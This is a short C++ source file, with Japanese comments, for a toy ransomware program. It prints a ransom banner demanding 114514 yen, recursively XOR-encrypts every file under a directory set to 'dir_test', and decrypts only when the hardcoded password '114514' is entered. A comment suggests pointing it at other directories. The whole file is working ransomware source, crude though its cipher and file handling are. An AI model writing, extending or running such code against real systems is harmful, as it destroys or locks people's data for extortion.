#include "ransome.hpp"

/* 適当なAA */
rw::rw() {
    std::cout << "\n ___  ___  ___  ___  ___  _____  ___  _ _ _  ___  ___  ___" << std::endl;
    std::cout << "|  _|| .'||   ||_ -|| . ||     || -_|| | | || .'||  _|| -_|" << std::endl;
    std::cout << "|_|  |__,||_|_||___||___||_|_|_||___||_____||__,||_|  |___|\n" << std::endl;
    std::cout << "We demand 114514 yen cash from you.\n" << std::endl;

    /* dir_testから違うディレクトリに変えてみるとまた面白いですね。 */
    p = "dir_test"; /* 一応テスト用なので... */
}

/* xor暗号の中身 */
void rw::xor_crypto(int key, int n) {
    std::ifstream ifs(filename, std::ios_base::in | std::ios_base::binary);
    if (!ifs) return;
    while (!ifs.eof())
    {
        std::getline(ifs, buf);
        data += buf + "\n";
    }
    ifs.close();
    strLen = data.size();
    std::ofstream ofs(filename, std::ios_base::out | std::ios_base::binary);
    for (size_t i = 0; i < data.size(); i++) data[i] ^= key;
    ofs.write(data.c_str(), strLen);
    ofs.close();
    data = "";
    strLen = 0;
}

/* 暗号 */
int rw::encode() {
    for(const std::filesystem::directory_entry &i:std::filesystem::recursive_directory_iterator(p))
    {
        if (!i.is_directory())
        {
            filename = i.path().string();
            xor_crypto(0x05, 1); /* 鍵は5 */
        }
    }
    return 0;
}

/* 復号 */
int rw::decode(int n) {
    for (const std::filesystem::directory_entry &i:std::filesystem::recursive_directory_iterator(p))
    {
        if (!i.is_directory())
        {
            filename = i.path().string();
            xor_crypto(n, 0);
        }
    }
    return 0;
}

bool rw::login() {
    std::cout << "Please passworld: ";
    std::cin >> pass;

    if (pass == "114514") decode(5);
    else                  return false;
    return true;
}
